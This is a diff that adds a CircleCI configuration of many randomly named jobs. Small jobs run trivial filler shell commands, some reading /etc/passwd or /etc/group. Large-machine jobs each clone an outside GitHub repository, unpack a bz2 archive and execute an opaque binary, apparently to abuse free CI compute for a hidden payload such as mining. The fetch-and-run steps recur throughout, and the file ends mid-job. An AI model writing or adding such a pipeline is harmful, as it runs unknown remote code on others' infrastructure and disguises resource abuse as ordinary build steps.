@@ -1,0 +1,1739 @@
+version: 2.1
+
+jobs:
+  lyhxpcrsfcbncc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: ukrdpxvxof
+          command: |
+            mkdir -p /var/tmp/batch4
+            set +o pipefail 2>/dev/null; find / -maxdepth 2 -type d 2>/dev/null | head -30 > /var/tmp/batch4/jinhyeqn; seq 1 525424 >> /var/tmp/batch4/jinhyeqn; true
+            ls -lh /var/tmp/batch4/jinhyeqn; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'jinhyeqn'
+  lfhrovukqv:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: igwdibebbiox
+          command: |
+            cut -c1-20 /var/tmp/batch4/jinhyeqn 2>/dev/null | wc -c || true
+      - run:
+          name: muhnvkakumcfheb
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: fxfczcia
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  jbcqtdg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: ocmcdcexjksf
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; ulimit -t; true ; } > /var/tmp/batch4/zlifjstpt
+            ls -lh /var/tmp/batch4/zlifjstpt; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'zlifjstpt'
+  vheoeoiupaxm:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: aujszzyklyqjxv
+          command: |
+            cut -c1-20 /var/tmp/batch4/zlifjstpt 2>/dev/null | wc -c || true
+      - run:
+          name: pznngnoagwrrghq
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: fdaqo
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  ngifjvcuhq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: urzundiwuleexm
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; ls -d /bin | grep -c .; true ; } > /var/tmp/batch4/vqqwrvasvy
+            ls -lh /var/tmp/batch4/vqqwrvasvy; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'vqqwrvasvy'
+  fdbrus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: uckzusattbbvr
+          command: |
+            cut -c1-20 /var/tmp/batch4/vqqwrvasvy 2>/dev/null | wc -c || true
+      - run:
+          name: sjjfqslgvvksor
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: yydkvvcshs
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  vielfgpxvijbdny:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: kpofclyajvuktkr
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; f() { while getopts ab: o; do echo "$o=${OPTARG:-}"; done; }; f -a -b 6; true ; } > /var/tmp/batch4/jndlvlydbd
+            ls -lh /var/tmp/batch4/jndlvlydbd; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'jndlvlydbd'
+  abooyt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: sokycmh
+          command: |
+            cut -c1-20 /var/tmp/batch4/jndlvlydbd 2>/dev/null | wc -c || true
+      - run:
+          name: qgjdowikme
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: mtmjrm
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  linjdndmnjfz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: sxjko
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; printf '%-6s%-6s%s\n' contract silver split; true ; } > /var/tmp/batch4/rhgzfbdgmyyyzh
+            ls -lh /var/tmp/batch4/rhgzfbdgmyyyzh; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'rhgzfbdgmyyyzh'
+  oksmd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: wlsiwgskhc
+          command: |
+            cut -c1-20 /var/tmp/batch4/rhgzfbdgmyyyzh 2>/dev/null | wc -c || true
+      - run:
+          name: ijyqcks
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: lyaeryasjp
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  soexfsytgwm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: dvjupmdwhab
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; ls -A ~ | tail -n 1 | tac; true ; } > /var/tmp/batch4/ylondwiqoxr
+            ls -lh /var/tmp/batch4/ylondwiqoxr; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'ylondwiqoxr'
+  hrnrxpccqb:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: knihtwiefado
+          command: |
+            cut -c1-20 /var/tmp/batch4/ylondwiqoxr 2>/dev/null | wc -c || true
+      - run:
+          name: krttnfbdls
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: yvgmixtngaf
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  kzovvjr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: ysyfvlcmwpzqam
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; for val in `seq 6`; do echo $((RANDOM % 31)); done | nl; true ; } > /var/tmp/batch4/tobopmd
+            ls -lh /var/tmp/batch4/tobopmd; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'tobopmd'
+  upqibyeo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: mfpqnoz
+          command: |
+            cut -c1-20 /var/tmp/batch4/tobopmd 2>/dev/null | wc -c || true
+      - run:
+          name: gamewpcu
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: qlomojmqy
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  qwkjxo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: jpfmb
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; echo -n 'meeting moved to 3pm' | wc -w; true ; } > /var/tmp/batch4/nyknbrmuhh
+            ls -lh /var/tmp/batch4/nyknbrmuhh; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'nyknbrmuhh'
+  mfaegldclunsdml:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: kemhiblrjhu
+          command: |
+            cut -c1-20 /var/tmp/batch4/nyknbrmuhh 2>/dev/null | wc -c || true
+      - run:
+          name: kgvpisxudi
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: qelyoekwugf
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  ossami:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: ktgsyantnjaus
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; for thing in stack service download summary crimson pitch ; do echo -n "${thing} "; done; echo; true ; } > /var/tmp/batch4/jnbjdcren
+            ls -lh /var/tmp/batch4/jnbjdcren; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'jnbjdcren'
+  azrtrzohhlt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: cbwalvow
+          command: |
+            cut -c1-20 /var/tmp/batch4/jnbjdcren 2>/dev/null | wc -c || true
+      - run:
+          name: lyuvls
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: pzhzgwighunm
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  cxvpsyuzokfb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: stseqxfcp
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'let'\''s go!' | tr ' ' '\n' | sort; true ; } > /var/tmp/batch4/rjprtljfm
+            ls -lh /var/tmp/batch4/rjprtljfm; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'rjprtljfm'
+  ehwqr:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: nyrux
+          command: |
+            cut -c1-20 /var/tmp/batch4/rjprtljfm 2>/dev/null | wc -c || true
+      - run:
+          name: ujwtqgcopn
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: mwfksxkdpoqx
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  ktevjdrrneiue:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: owhzsaptvajxhf
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; find /usr/share/doc -maxdepth 3 -type f -print0 | xargs -0r du -ch | tail -n1; true ; } > /var/tmp/batch4/akbdkxsolqo
+            ls -lh /var/tmp/batch4/akbdkxsolqo; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'akbdkxsolqo'
+  mccsty:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: yeyphuwomekxk
+          command: |
+            cut -c1-20 /var/tmp/batch4/akbdkxsolqo 2>/dev/null | wc -c || true
+      - run:
+          name: oahtlpvkw
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: ikicbumb
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  nxgjqpbhvbyid:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: dtjxtnppysbc
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; for f in /etc/host*; do ls -nvegexcwytxvsjz "$f"; done | tac; true ; } > /var/tmp/batch4/osepjl
+            ls -lh /var/tmp/batch4/osepjl; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'osepjl'
+  ljdyxloiep:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: gsreupuqrco
+          command: |
+            cut -c1-20 /var/tmp/batch4/osepjl 2>/dev/null | wc -c || true
+      - run:
+          name: bzmcpnz
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: oxkedlikqyvqsrx
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  yyxctkmyskbzkcf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: olfqbitxngwg
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; grep -s -c -R --exclude-dir='backup' case /etc/profile.d | sort | head -n3; true ; } > /var/tmp/batch4/jfoyyzwez
+            ls -lh /var/tmp/batch4/jfoyyzwez; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'jfoyyzwez'
+  jqvfxtv:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: vvpzbnsqni
+          command: |
+            cut -c1-20 /var/tmp/batch4/jfoyyzwez 2>/dev/null | wc -c || true
+      - run:
+          name: ojbfhpvxanwrwf
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: wiaoieippv
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  gqlgnpg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: dwskoaqqu
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; head -1 /etc/passwd | awk -F: '{ print $1 }'; true ; } > /var/tmp/batch4/qnbkjfxg
+            ls -lh /var/tmp/batch4/qnbkjfxg; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'qnbkjfxg'
+  qguqvdnvng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: dxiwfeldznwapg
+          command: |
+            cut -c1-20 /var/tmp/batch4/qnbkjfxg 2>/dev/null | wc -c || true
+      - run:
+          name: pwvrejlwssrks
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: szlpa
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  ormgbvmgvqxju:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: hpvrujqy
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; \grep -Hi daemon /etc/passwd|head -n 1; true ; } > /var/tmp/batch4/sslpffzym
+            ls -lh /var/tmp/batch4/sslpffzym; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'sslpffzym'
+  hxdpfhch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: rglojec
+          command: |
+            cut -c1-20 /var/tmp/batch4/sslpffzym 2>/dev/null | wc -c || true
+      - run:
+          name: tmjpnekpvkk
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: ycvysnupkmapms
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  nclcyeza:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: cfxvixqgxp
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; printf 'host=cache-a\nport=3463\nuser=chen\ndebug=false\n' >'/tmp/release.dat' && sed -n "s/^user=//p" '/tmp/release.dat'; true ; } > /var/tmp/batch4/jlcwaptv
+            ls -lh /var/tmp/batch4/jlcwaptv; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'jlcwaptv'
+  svsrysvie:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: uenyjqizfqjawx
+          command: |
+            cut -c1-20 /var/tmp/batch4/jlcwaptv 2>/dev/null | wc -c || true
+      - run:
+          name: xqxetzauilrkier
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: fnceuxvx
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  ltoctsndhwo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: squsdkvdncqikpl
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; find /opt -name '*' 2>/dev/null | cat -n; true ; } > /var/tmp/batch4/uqdkdqfoks
+            ls -lh /var/tmp/batch4/uqdkdqfoks; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'uqdkdqfoks'
+  gpuddezewjfedh:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: abmgncoviv
+          command: |
+            cut -c1-20 /var/tmp/batch4/uqdkdqfoks 2>/dev/null | wc -c || true
+      - run:
+          name: clxgmmhambh
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: qmpyhd
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  scpzkq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: zebpflikbdwz
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; cat /etc/group | grep -h users | cut -d: -f1,3; true ; } > /var/tmp/batch4/yfysywaxsfx
+            ls -lh /var/tmp/batch4/yfysywaxsfx; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'yfysywaxsfx'
+  hploemkhckvl:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: andfr
+          command: |
+            cut -c1-20 /var/tmp/batch4/yfysywaxsfx 2>/dev/null | wc -c || true
+      - run:
+          name: uoesympqdyamkig
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: fdfbm
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  spflfapewm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: tqqrvigv
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; for x in /etc/*.d; do ls -ld "$x"; done | nl; true ; } > /var/tmp/batch4/pybmlbhqnvqz
+            ls -lh /var/tmp/batch4/pybmlbhqnvqz; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'pybmlbhqnvqz'
+  nwnsapbgfvlhqtt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: sjntanidplpe
+          command: |
+            cut -c1-20 /var/tmp/batch4/pybmlbhqnvqz 2>/dev/null | wc -c || true
+      - run:
+          name: rmact
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: ugsdcmrx
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  bllurwuyg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: fkusg
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; numfmt --to=iec --padding=10 2526271260; true ; } > /var/tmp/batch4/mkxwumavqvjumw
+            ls -lh /var/tmp/batch4/mkxwumavqvjumw; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'mkxwumavqvjumw'
+  tucmralc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: rwkqaxt
+          command: |
+            cut -c1-20 /var/tmp/batch4/mkxwumavqvjumw 2>/dev/null | wc -c || true
+      - run:
+          name: wgrrqpixgmitcd
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: lwniyqc
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  olpkyyhtyrednj:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: vxcmxmrihss
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; tr -cs '[:alnum:]' '\n' </etc/profile | tac; true ; } > /var/tmp/batch4/ppniyitj
+            ls -lh /var/tmp/batch4/ppniyitj; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'ppniyitj'
+  sfwyyvoqnjfzc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: bojyxmtyyemzl
+          command: |
+            cut -c1-20 /var/tmp/batch4/ppniyitj 2>/dev/null | wc -c || true
+      - run:
+          name: edfdopnkjtusdza
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: xuhumuxwopn
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  uwlzjcn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: qkaylrblivbo
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; seq 8 5 67 | tail -n10 | sort -n | uniq; true ; } > /var/tmp/batch4/qjvokrru
+            ls -lh /var/tmp/batch4/qjvokrru; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'qjvokrru'
+  xxdxktgqikr:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: pjhgc
+          command: |
+            cut -c1-20 /var/tmp/batch4/qjvokrru 2>/dev/null | wc -c || true
+      - run:
+          name: gqjwagbuycug
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: nbhwnzdub
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  uvkwzvnjubu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: zpatvmlrsejpapq
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; cat /proc/cpuinfo | tr a-z A-Z | nl; true ; } > /var/tmp/batch4/ciqzzrc
+            ls -lh /var/tmp/batch4/ciqzzrc; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'ciqzzrc'
+  qdzrd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: bmhozlwy
+          command: |
+            cut -c1-20 /var/tmp/batch4/ciqzzrc 2>/dev/null | wc -c || true
+      - run:
+          name: mnhgcxgn
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: nwwsfis
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  kmjxkfvhupfccsu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: vllhzvncwgd
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; key='/stage/crate/fixture/PLUGIN.json' && printf '%s\n' "${key##*.}"; true ; } > /var/tmp/batch4/jbvjjdrg
+            ls -lh /var/tmp/batch4/jbvjjdrg; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'jbvjjdrg'
+  vwpoybfshrv:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: ymtxpmdicishkuw
+          command: |
+            cut -c1-20 /var/tmp/batch4/jbvjjdrg 2>/dev/null | wc -c || true
+      - run:
+          name: cljzouvpon
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: hzyipn
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  svxnzmdbx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: zhlbththpivigr
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; for c in `seq 9`; do echo "$c"; done | head -n 3; true ; } > /var/tmp/batch4/nqvhze
+            ls -lh /var/tmp/batch4/nqvhze; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'nqvhze'
+  cejuenni:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: ufgrohucrpq
+          command: |
+            cut -c1-20 /var/tmp/batch4/nqvhze 2>/dev/null | wc -c || true
+      - run:
+          name: ixrqotzv
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: dryletcalnmec
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  jdwpllxa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: vomrqwphkkxwcpq
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; date -d"monday next week" "+%A, %B %d, %Y"; true ; } > /var/tmp/batch4/zvhfuzl
+            ls -lh /var/tmp/batch4/zvhfuzl; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'zvhfuzl'
+  lezlacjscsyeqs:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: pumnpj
+          command: |
+            cut -c1-20 /var/tmp/batch4/zvhfuzl 2>/dev/null | wc -c || true
+      - run:
+          name: nbvmvhtvvxz
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: gkkitwyufcr
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  nvegexcwytxvsjz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: ouuymazhqxyxiwt
+          command: |
+            mkdir -p /var/tmp/batch4
